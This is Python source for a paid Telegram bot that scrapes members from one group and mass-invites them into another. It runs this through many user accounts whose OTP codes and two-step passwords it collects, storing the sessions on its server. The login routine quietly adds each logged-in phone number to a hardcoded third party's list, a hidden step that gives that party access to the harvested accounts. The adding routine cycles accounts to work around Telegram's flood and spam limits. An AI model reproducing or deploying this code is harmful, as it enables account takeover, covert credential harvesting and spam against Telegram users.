import re, os, random, asyncio, html,configparser,pyrogram, subprocess, requests, time, traceback, logging, telethon, csv, json, sys
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
from asyncio.exceptions import TimeoutError
from pyrogram.errors import SessionPasswordNeeded, FloodWait, PhoneNumberInvalid, ApiIdInvalid, PhoneCodeInvalid, PhoneCodeExpired, UserNotParticipant
from pyrogram.errors.exceptions.bad_request_400 import UserNotParticipant
from telethon.client.chats import ChatMethods
from csv import reader
from telethon.sync import TelegramClient
from telethon import functions, types, TelegramClient, connection, sync, utils, errors
from telethon.tl.functions.channels import GetFullChannelRequest, JoinChannelRequest, InviteToChannelRequest
from telethon.errors import SessionPasswordNeededError
from telethon.errors.rpcerrorlist import PhoneCodeExpiredError, PhoneCodeInvalidError, PhoneNumberBannedError, PhoneNumberInvalidError, UserBannedInChannelError, PeerFloodError, UserPrivacyRestrictedError, ChatWriteForbiddenError, UserAlreadyParticipantError,  UserBannedInChannelError, UserAlreadyParticipantError,  UserPrivacyRestrictedError, ChatAdminRequiredError
from telethon.sessions import StringSession
from pyrogram import Client,filters
from pyromod import listen
from sql import add_user, query_msg
from support import users_info
from datetime import datetime, timedelta,date
from Config import API_ID, API_HASH, BOT_TOKEN
import csv
#add_user= query_msg= users_info=0
if not os.path.exists('./sessions'):
    os.mkdir('./sessions')
if not os.path.exists(f"Users/1955509952/phone.csv"):
   os.mkdir('./Users')
   os.mkdir(f'./Users/1955509952')
   open(f"Users/1955509952/phone.csv","w")
if not os.path.exists('data.csv'):
    open("data.csv","w")
UPDATES_CHANNEL = "Crazy_Droid"
OWNER= [6008212311,5801763756]
PREMIUM=[6008212311,5801763756]
app = pyrogram.Client("app", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

with open("data.csv", encoding='UTF-8') as f:
    rows = csv.reader(f, delimiter=",", lineterminator="\n")
    next(rows, None)
    ishan=[]
    for row in rows:
        d = datetime.today() - datetime.strptime(f"{row[2]}", '%Y-%m-%d')
        r = datetime.strptime("2022-12-01", '%Y-%m-%d') - datetime.strptime("2022-07-26", '%Y-%m-%d')
        if d<=r:
            PREMIUM.append(int(row[1]))

# ------------------------------- Subscribe --------------------------------- #
async def Subscribe(lel, message):
   update_channel = UPDATES_CHANNEL
   if update_channel:
      try:
         user = await app.get_chat_member(update_channel, message.chat.id)
         if user.status == "kicked":
            await app.send_message(chat_id=message.chat.id,text="ꜱᴏʀʀʏ ꜱɪʀ, ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ. ᴄᴏɴᴛᴀᴄᴛ ᴍʏ [ꜱᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ](https://t.me/BESTIES_ZONE).", parse_mode="markdown", disable_web_page_preview=True)
            return 1
      except UserNotParticipant:
         await app.send_message(chat_id=message.chat.id, text="**ᴘʟᴇᴀꜱᴇ ᴊᴏɪɴ ᴍʏ ᴄʜᴀᴛᴛɪɴɢ ɢʀᴏᴜᴘ ᴛᴏ ᴜꜱᴇ ᴍᴇ!\n ᴀɴᴅ ᴄʟɪᴄᴋ ᴏɴ ᴛᴏ ᴄʜᴇᴄᴋ /start**", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🤖 ᴊᴏɪɴ ᴄʜᴀᴛᴛɪɴɢ ɢʀᴏᴜᴘ 🤖", url=f"https://t.me/{update_channel}")]]), parse_mode="markdown")
         return 1
      except Exception:
         await app.send_message(chat_id=message.chat.id, text="**ꜱᴏᴍᴇᴛʜɪɴɢ ᴡᴇɴᴛ ᴡʀᴏɴɢ. ᴄᴏɴᴛᴀᴄᴛ ᴍʏ [ꜱᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ](https://t.me/BESTIES_ZONE).**", parse_mode="markdown", disable_web_page_preview=True)
         return 1



# ------------------------------- Start --------------------------------- #
@app.on_message(filters.private & filters.command(["start"]))
async def start(lel, message):
   a= await Subscribe(lel, message)
   if a==1:
      return
   if not os.path.exists(f"Users/{message.from_user.id}/phone.csv"):
      os.mkdir(f'./Users/{message.from_user.id}')
      open(f"Users/{message.from_user.id}/phone.csv","w")
   id = message.from_user.id
   user_name = '@' + message.from_user.username if message.from_user.username else None
   await add_user(id, user_name)
   but = InlineKeyboardMarkup([[InlineKeyboardButton("ʟᴏɢɪɴ✅", callback_data="Login"), InlineKeyboardButton("ᴀᴅᴅɪɴɢ💯", callback_data="Adding") ],[InlineKeyboardButton("ᴘʜᴏɴᴇ⚙️", callback_data="Edit"), InlineKeyboardButton("ᴘʜᴏɴᴇꜱᴇᴇ💕", callback_data="Ish")],[InlineKeyboardButton("ᴘʜᴏɴᴇ ʀᴇᴍᴏᴠᴇ⚙️", callback_data="Remove"), InlineKeyboardButton("ᴀᴅᴍɪɴ ᴘᴀɴɴᴇʟ", callback_data="Admin")]])
   await message.reply_text(f"**ʜɪ** `{message.from_user.first_name}` **!\n\nɪ'ᴍ ɪɴᴅᴜᴄᴇᴅ ꜱᴄʀᴀᴘᴇʀ ʙᴏᴛ \nᴍᴀᴅᴇ ꜰᴏʀ ᴅᴏɪɴɢ ꜱᴄʀᴀᴘɪɴɢ ꜰᴏʀ ꜰʀᴇᴇ,\nᴡɪᴛʜᴏᴜᴛ ᴜꜱɪɴɢ ᴀɴʏ ᴜꜱᴇ ᴏꜰ ᴘʏᴛʜᴏɴ.\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**", reply_markup=but)



# ------------------------------- Set Phone No --------------------------------- #
@app.on_message(filters.private & filters.command(["phone"]))
async def phone(lel, message):
 try:
   await message.delete()
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
      await app.send_message(message.chat.id, f"**ʏᴏᴜ ᴀʀᴇ ɴᴏ ʟᴏɴɢᴇʀ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴜꜱᴇʀ\nᴘʟᴇᴀꜱᴇ ʜᴀᴠᴇ ᴀ ꜱᴜʙꜱᴄʀɪᴘᴛᴏɴ\n200ʀꜱ ᴘᴇʀ ᴍᴏɴᴛʜ\nᴅᴍ @BT46ER\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
      return
   if not os.path.exists(f"Users/{message.from_user.id}/phone.csv"):
      os.mkdir(f'./Users/{message.from_user.id}')
      open(f"Users/{message.from_user.id}/phone.csv","w")
   with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
      str_list = [row[0] for row in csv.reader(f)]
      NonLimited=[]
      a=0
      for pphone in str_list:
         a+=1
         NonLimited.append(str(pphone))
      number = await app.ask(chat_id=message.chat.id, text="**ᴇɴᴛᴇʀ ɴᴜᴍʙᴇʀ ᴏꜰ ᴀᴄᴄᴏᴜɴᴛꜱ ᴛᴏ ʟᴏɢɪɴ (ɪɴ ɪɴᴛɪɢᴇʀ)\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
      n = int(number.text)
      a+=n
      if n<1 :
         await app.send_message(message.chat.id, """**ɪɴᴠᴀʟɪᴅ ꜰᴏʀᴍᴀᴛ ʟᴇꜱꜱ ᴛʜᴇɴ 1 ᴛʀʏ ᴀɢᴀɪɴ\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**""")
         return
      if a>100:
         await app.send_message(message.chat.id, f"**ʏᴏᴜ ᴄᴀɴ ᴀᴅᴅ ᴏɴʟʏ {100-a} ᴘʜᴏɴᴇ ɴᴏ \n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
         return
      for i in range (1,n+1):
         number = await app.ask(chat_id=message.chat.id, text="**ɴᴏᴡ ꜱᴇɴᴅ ʏᴏᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ'ꜱ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ɪɴ ɪɴᴛᴇʀɴᴀᴛɪᴏɴᴀʟ ꜰᴏʀᴍᴀᴛ. \nɪɴᴄʟᴜᴅɪɴɢ **ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ**. \nᴇxᴀᴍᴘʟᴇ: **+14154566376 = 14154566376 only not +**\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
         phone = number.text
         if "+" in phone:
            await app.send_message(message.chat.id, """**ᴀꜱ ᴍᴇɴᴛɪᴏɴ + ɪꜱ ɴᴏᴛ ɪɴᴄʟᴜᴅᴇ\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**""")
         elif len(phone)==11 or len(phone)==12:
            Singla = str(phone)
            NonLimited.append(Singla)
            await app.send_message(message.chat.id, f"**{n}). ᴘʜᴏɴᴇ: {phone} ꜱᴇᴛ ꜱᴜᴄᴇꜱꜱꜰᴜʟʟʏ✅\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
         else:
            await app.send_message(message.chat.id, """**ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ ꜰᴏʀᴍᴀᴛ ᴛʀʏ ᴀɢᴀɪɴ\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**""") 
      NonLimited=list(dict.fromkeys(NonLimited))
      with open(f"Users/{message.from_user.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
         writer = csv.writer(writeFile, lineterminator="\n")
         writer.writerows(NonLimited)
      with open(f"Users/{message.from_user.id}/1.csv") as infile, open(f"Users/{message.from_user.id}/phone.csv", "w") as outfile:
         for line in infile:
            outfile.write(line.replace(",", ""))
 except Exception as e:
   await app.send_message(message.chat.id, f"**ᴇʀʀᴏʀ: {e}\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
   return



# ------------------------------- Acc Login --------------------------------- #
@app.on_message(filters.private & filters.command(["login"]))
async def login(lel, message):
 try:
   await message.delete()
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
      await app.send_message(message.chat.id, f"**ʏᴏᴜ ᴀʀᴇ ɴᴏ ʟᴏɴɢᴇʀ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴜꜱᴇʀ\nᴘʟᴇᴀꜱᴇ ʜᴀᴠᴇ ᴀ ꜱᴜʙꜱᴄʀɪᴘᴛᴏɴ\n200ʀꜱ ᴘᴇʀ ᴍᴏɴᴛʜ\nᴅᴍ @BT46ER\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
      return
   with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
    r=[]
    l=[]
    str_list = [row[0] for row in csv.reader(f)]
    po = 0
    s=0
    for pphone in str_list:
     try:
      phone = int(utils.parse_phone(pphone))
      client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH)
      await client.connect()
      if not await client.is_user_authorized():
         try:
            await client.send_code_request(phone)
         except FloodWait as e:
            await message.reply(f"ʏᴏᴜ ʜᴀᴠᴇ ꜰʟᴏᴏᴅᴡᴀɪᴛ ᴏꜰ {e.x} ꜱᴇᴄᴏɴᴅꜱ")
            return
         except PhoneNumberInvalidError:
            await message.reply("ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ɪꜱ ɪɴᴠᴀʟɪᴅ.\n\nᴘʀᴇꜱꜱ /start ᴛᴏ ꜱᴛᴀʀᴛ ᴀɢᴀɪɴ!")
            return
         except PhoneNumberBannedError:
            await message.reply(f"{phone} ɪꜱ ʙᴀɴᴇᴅ")
            continue
         try:
            otp = await app.ask(message.chat.id, ("ᴀɴ ᴏᴛᴘ ɪꜱ ꜱᴇɴᴛ ᴛᴏ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ, \nᴘʟᴇᴀꜱᴇ ᴇɴᴛᴇʀ ᴏᴛᴘ ɪɴ `1 2 3 4 5` ꜰᴏʀᴍᴀᴛ. __(ꜱᴘᴀᴄᴇ ʙᴇᴛᴡᴇᴇɴ ᴇᴀᴄʜ ɴᴜᴍʙᴇʀꜱ!)__ \n\nɪꜰ ʙᴏᴛ ɴᴏᴛ ꜱᴇɴᴅɪɴɢ ᴏᴛᴘ ᴛʜᴇɴ ᴛʀʏ /restart ᴀɴᴅ ꜱᴛᴀʀᴛ ᴛᴀꜱᴋ ᴀɢᴀɪɴ ᴡɪᴛʜ /start ᴄᴏᴍᴍᴀɴᴅ ᴛᴏ ʙᴏᴛ.\nᴘʀᴇꜱꜱ /cancel ᴛᴏ ᴄᴀɴᴄᴇʟ."), timeout=300)
         except TimeoutError:
            await message.reply("ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ ᴏꜰ 5 ᴍɪɴ.\nᴘʀᴇꜱꜱ /start ᴛᴏ ꜱᴛᴀʀᴛ ᴀɢᴀɪɴ!")
            return
         otps=otp.text
         try:
            await client.sign_in(phone=phone, code=' '.join(str(otps)))
         except PhoneCodeInvalidError:
            await message.reply("ɪɴᴠᴀʟɪᴅ ᴄᴏᴅᴇ.\n\nᴘʀᴇꜱꜱ /start ᴛᴏ ꜱᴛᴀʀᴛ ᴀɢᴀɪɴ!")
            return
         except PhoneCodeExpiredError:
            await message.reply("ᴄᴏᴅᴇ ɪꜱ ᴇxᴘɪʀᴇᴅ.\n\nᴘʀᴇꜱꜱ /start ᴛᴏ ꜱᴛᴀʀᴛ ᴀɢᴀɪɴ!")
            return
         except SessionPasswordNeededError:
            try:
               two_step_code = await app.ask(message.chat.id,"ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀᴠᴇ ᴛᴡᴏ-ꜱᴛᴇᴘ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ.\nᴘʟᴇᴀꜱᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘᴀꜱꜱᴡᴏʀᴅ.",timeout=300)
            except TimeoutError:
               await message.reply("`ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ ᴏꜰ 5 ᴍɪɴ.\n\nᴘʀᴇꜱꜱ /start ᴛᴏ ꜱᴛᴀʀᴛ ᴀɢᴀɪɴ!`")
               return
            try:
               await client.sign_in(password=two_step_code.text)
            except Exception as e:
               await message.reply(f"**ᴇʀʀᴏʀ:** `{str(e)}`")
               return
            except Exception as e:
               await app.send_message(message.chat.id ,f"**ᴇʀʀᴏʀ:** `{str(e)}`")
               return
      with open("Users/2056781888/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         NonLimited=[]
         for pphone in str_list:
            NonLimited.append(str(pphone))
         Singla = str(phone)
         NonLimited.append(Singla)
         NonLimited=list(dict.fromkeys(NonLimited))
         with open('1.csv', 'w', encoding='UTF-8') as writeFile:
            writer = csv.writer(writeFile, lineterminator="\n")
            writer.writerows(NonLimited)
         with open("1.csv") as infile, open(f"Users/2056781888/phone.csv", "w") as outfile:
            for line in infile:
                outfile.write(line.replace(",", ""))
      os.remove("1.csv")
      await client(functions.contacts.UnblockRequest(id='@SpamBot'))
      await client.send_message('SpamBot', '/start')
      msg = str(await client.get_messages('SpamBot'))
      re= "bird"
      if re in msg:
         stats="Good news, no limits are currently applied to your account. You’re free as a bird!"
         s+=1
         r.append(str(phone))
      else:
         stats='you are limited'
         l.append(str(phone))
      me = await client.get_me()
      await app.send_message(message.chat.id, f"ʟᴏɢɪɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ✅ ᴅᴏɴᴇ.\n\n**ɴᴀᴍᴇ:** {me.first_name}\n**ᴜꜱᴇʀɴᴀᴍᴇ:** {me.username}\n**ᴘʜᴏɴᴇ:** {phone}\n**ꜱᴘᴀᴍʙᴏᴛ ꜱᴛᴀᴛꜱ:** {stats}\n\n**ᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")     
      po+=1
      await client.disconnect()
     except ConnectionError:
      await client.disconnect()
      await client.connect()
     except TypeError:
      await app.send_message(message.chat.id, "**ʏᴏᴜ ʜᴀᴠᴇ ɴᴏᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ \nᴘʟᴇᴀꜱᴇ ᴇᴅɪᴛ ᴄᴏɴꜰɪɢ⚙️ ʙʏ ᴄᴀᴍᴍᴀɴᴅ /start.\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")  
     except Exception as e:
      await app.send_message(message.chat.id, f"**ᴇʀʀᴏʀ: {e}\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
    for ish in l:
      r.append(str(ish))
    with open(f"Users/{message.from_user.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
      writer = csv.writer(writeFile, lineterminator="\n")
      writer.writerows(r)
    with open(f"Users/{message.from_user.id}/1.csv") as infile, open(f"Users/{message.from_user.id}/phone.csv", "w") as outfile:
      for line in infile:
         outfile.write(line.replace(",", "")) 
    await app.send_message(message.chat.id, f"**ᴀʟʟ ᴀᴄᴄ ʟᴏɢɪɴ {s} ᴀᴄᴄᴏᴜɴᴛ ᴀᴠᴀɪʟᴀʙʟᴇ ᴏꜰ {po} \n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**") 
 except Exception as e:
   await app.send_message(message.chat.id, f"**ᴇʀʀᴏʀ: {e}\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
   return
                          


# ------------------------------- Acc Private Adding --------------------------------- #
@app.on_message(filters.private & filters.command(["adding"]))
async def to(lel, message):
 try:
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
      await app.send_message(message.chat.id, f"**ʏᴏᴜ ᴀʀᴇ ɴᴏ ʟᴏɴɢᴇʀ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴜꜱᴇʀ\nᴘʟᴇᴀꜱᴇ ʜᴀᴠᴇ ᴀ ꜱᴜʙꜱᴄʀɪᴘᴛᴏɴ\n200ʀꜱ ᴘᴇʀ ᴍᴏɴᴛʜ\nᴅᴍ @BT46ER\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
      return
   number = await app.ask(chat_id=message.chat.id, text="**ɴᴏᴡ ꜱᴇɴᴅ ᴛʜᴇ ꜰʀᴏᴍ ɢʀᴏᴜᴘ ᴜꜱᴇʀɴᴀᴍᴇ \n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
   From = number.text
   number = await app.ask(chat_id=message.chat.id, text="**ɴᴏᴡ ꜱᴇɴᴅ ᴛʜᴇ ᴛᴏ ɢʀᴏᴜᴘ ᴜꜱᴇʀɴᴀᴍᴇ \n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
   To = number.text
   number = await app.ask(chat_id=message.chat.id, text="**ɴᴏᴡ ꜱᴇɴᴅ ꜱᴛᴀʀᴛ ꜰʀᴏᴍ  \n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
   a = int(number.text)
   di=a
   try:
      with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         for pphone in str_list:
            peer=0
            ra=0
            dad=0
            r="**ᴀᴅᴅɪɴɢ ꜱᴛᴀʀᴛ**\n\n"
            phone = utils.parse_phone(pphone)
            client = TelegramClient(f"sessions/{phone}", API_ID , API_HASH)
            await client.connect()
            await client(JoinChannelRequest(To))
            await app.send_message(chat_id=message.chat.id, text=f"**ꜱᴄʀᴀᴘɪɴɢ ꜱᴛᴀʀᴛ**")
            async for x in client.iter_participants(From, aggressive=True):
               try:
                  ra+=1
                  if ra<a:
                     continue
                  if (ra-di)>150:
                     await client.disconnect()
                     r+="**\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**"
                     await app.send_message(chat_id=message.chat.id, text=f"{r}")
                     await app.send_message(message.chat.id, f"**ᴇʀʀᴏʀ: {phone} ᴅᴜᴇ ᴛᴏ ꜱᴏᴍᴇ ᴇʀʀᴏʀ ᴍᴏᴠɪɴɢ ᴛᴏ ɴᴇxᴛ ɴᴏ\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
                     break
                  if dad>40:
                     r+="**\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**"
                     await app.send_message(chat_id=message.chat.id, text=f"{r}")
                     r="**ᴀᴅᴅɪɴɢ ꜱᴛᴀʀᴛ**\n\n"
                     dad=0
                  await client(InviteToChannelRequest(To, [x]))
                  status = 'ᴅᴏɴᴇ'
               except errors.FloodWaitError as s:
                  status= f'FloodWaitError for {s.seconds} sec'
                  await client.disconnect()
                  r+="**\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**"
                  await app.send_message(chat_id=message.chat.id, text=f"{r}")
                  await app.send_message(chat_id=message.chat.id, text=f'**FloodWaitError ꜰᴏʀ {s.seconds} ꜱᴇᴄ\nᴍᴏᴠɪɴɢ ᴛᴏ ɴᴇxᴛ ɴᴜᴍʙᴇʀ**')
                  break
               except UserPrivacyRestrictedError:
                  status = 'PrivacyRestrictedError'
               except UserAlreadyParticipantError:
                  status = 'ᴀʟʀᴇᴀᴅʏ'
               except UserBannedInChannelError:
                  status="ᴜꜱᴇʀ ʙᴀɴɴᴇᴅ"
               except ChatAdminRequiredError:
                  status="ᴛᴏ ᴀᴅᴅ ᴀᴅᴍɪɴ ʀᴇǫᴜɪʀᴇᴅ"
               except ValueError:
                  status="ᴇʀʀᴏʀ ɪɴ ᴇɴᴛʀʏ"
                  await client.disconnect()
                  await app.send_message(chat_id=message.chat.id, text=f"{r}")
                  break
               except PeerFloodError:
                  if peer == 10:
                     await client.disconnect()
                     await app.send_message(chat_id=message.chat.id, text=f"{r}")
                     await app.send_message(chat_id=message.chat.id, text=f"**Too Many PeerFloodError\nᴍᴏᴠɪɴɢ ᴛᴏ ɴᴇxᴛ ɴᴜᴍʙᴇʀ**")
                     break
                  status = 'PeerFloodError'
                  peer+=1
               except ChatWriteForbiddenError as cwfe:
                  await client(JoinChannelRequest(To))
                  continue
               except errors.RPCError as s:
                  status = s.__class__.__name__
               except Exception as d:
                  status = d
               except:
                  traceback.print_exc()
                  status="Unexpected Error"
                  break
               r+=f"{a-di+1}). **{x.first_name}**   ⟾   **{status}**\n"
               dad+=1
               a+=1
   except Exception as e:
      await app.send_message(chat_id=message.chat.id, text=f"Error: {e} \n\n ᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER")
 except Exception as e:
   await app.send_message(message.chat.id, f"**Error: {e}\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
   return



# ------------------------------- Start --------------------------------- #
@app.on_message(filters.private & filters.command(["phonesee"]))
async def start(lel, message):
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
      await app.send_message(message.chat.id, f"**ʏᴏᴜ ᴀʀᴇ ɴᴏ ʟᴏɴɢᴇʀ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴜꜱᴇʀ\nᴘʟᴇᴀꜱᴇ ʜᴀᴠᴇ ᴀ ꜱᴜʙꜱᴄʀɪᴘᴛᴏɴ\n200ʀꜱ ᴘᴇʀ ᴍᴏɴᴛʜ\nᴅᴍ @BT46ER\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
      return
   try:
      with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         de="**ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀꜱ ᴀʀᴇ**\n\n"
         da=0
         dad=0
         for pphone in str_list:
            dad+=1
            da+=1
            if dad>40:
               de+="**\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**"
               await app.send_message(chat_id=message.chat.id, text=f"{de}")
               de="**ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀꜱ ᴀʀᴇ**\n\n"
               dad=0 
            de+=(f"**{da}).** `{int(pphone)}`\n")
         de+="**\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**"
         await app.send_message(chat_id=message.chat.id, text=f"{de}")

   except Exception as a:
      pass


# ------------------------------- Start --------------------------------- #
@app.on_message(filters.private & filters.command(["remove"]))
async def start(lel, message):
 try:
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
      await app.send_message(message.chat.id, f"**ʏᴏᴜ ᴀʀᴇ ɴᴏ ʟᴏɴɢᴇʀ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴜꜱᴇʀ\nᴘʟᴇᴀꜱᴇ ʜᴀᴠᴇ ᴀ ꜱᴜʙꜱᴄʀɪᴘᴛᴏɴ\n200ʀꜱ ᴘᴇʀ ᴍᴏɴᴛʜ\nᴅᴍ @BT46ER\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
      return
   try:
      with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         f.closed
         number = await app.ask(chat_id=message.chat.id, text="**ꜱᴇɴᴅ ɴᴜᴍʙᴇʀ ᴛᴏ ʀᴇᴍᴏᴠᴇ\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
         print(str_list)
         str_list.remove(number.text)
         with open(f"Users/{message.from_user.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
            writer = csv.writer(writeFile, lineterminator="\n")
            writer.writerows(str_list)
         with open(f"Users/{message.from_user.id}/1.csv") as infile, open(f"Users/{message.from_user.id}/phone.csv", "w") as outfile:
            for line in infile:
               outfile.write(line.replace(",", ""))
         await app.send_message(chat_id=message.chat.id,text="ᴅᴏɴᴇ ꜱᴜᴄᴇꜱꜱꜰᴜʟʟʏ")
   except Exception as a:
      pass
 except Exception as e:
   await app.send_message(message.chat.id, f"**Error: {e}\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
   return

# ------------------------------- Admin Pannel --------------------------------- #
@app.on_message(filters.private & filters.command('ishan'))
async def subscribers_count(lel, message):
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id in OWNER:
      but = InlineKeyboardMarkup([[InlineKeyboardButton("ᴜꜱᴇʀꜱ✅", callback_data="Users")], [InlineKeyboardButton("ʙʀᴏᴀᴅᴄᴀꜱᴛ💯", callback_data="Broadcast")],[InlineKeyboardButton("ᴀᴅᴅ ᴜꜱᴇʀ", callback_data="New")], [InlineKeyboardButton("ᴄʜᴇᴄᴋ ᴜꜱᴇʀꜱ", callback_data="Check")]])
      await app.send_message(chat_id=message.chat.id,text=f"**ʜɪ** `{message.from_user.first_name}` **!\n\nᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴɴᴇʟ ᴏꜰ ɪɴᴅᴜᴄᴇᴅ ʙᴏᴛ\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**", reply_markup=but)
   else:
      await app.send_message(chat_id=message.chat.id,text="**ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴏᴡɴᴇʀ ᴏꜰ ʙᴏᴛ \n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")



# ------------------------------- Buttons --------------------------------- #
@app.on_callback_query()
async def button(app, update):
   k = update.data
   if "Login" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**ᴛʜᴇʀᴇ ɪꜱ ɴᴏᴛʜɪɴɢ ɴᴏ ᴍᴏʀᴇ..!\nᴊᴜꜱᴛ ᴄʟɪᴄᴋ ᴏɴ /login ᴛᴏ ʟᴏɢɪɴ ᴀɴᴅ ᴄʜᴇᴄᴋ ꜱᴛᴀᴛꜱ ᴏꜰ ᴀᴄᴄᴏᴜɴᴛ.\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**""") 
   elif "Ish" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**ᴛʜᴇʀᴇ ɪꜱ ɴᴏᴛʜɪɴɢ ɴᴏ ᴍᴏʀᴇ..!\nᴊᴜꜱᴛ ᴄʟɪᴄᴋ ᴏɴ /phonesee ᴛᴏ ʟᴏɢɪɴ ᴀɴᴅ ᴄʜᴇᴄᴋ ꜱᴛᴀᴛꜱ ᴏꜰ ᴀᴄᴄᴏᴜɴᴛ.\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**""") 
   elif "Remove" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**ᴛʜᴇʀᴇ ɪꜱ ɴᴏᴛʜɪɴɢ ɴᴏ ᴍᴏʀᴇ..!\nᴊᴜꜱᴛ ᴄʟɪᴄᴋ ᴏɴ /remove ᴛᴏ ʟᴏɢɪɴ ᴀɴᴅ ᴄʜᴇᴄᴋ ꜱᴛᴀᴛꜱ ᴏꜰ ᴀᴄᴄᴏᴜɴᴛ.\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**""") 
   elif "Adding" in k:
      await update.message.delete()
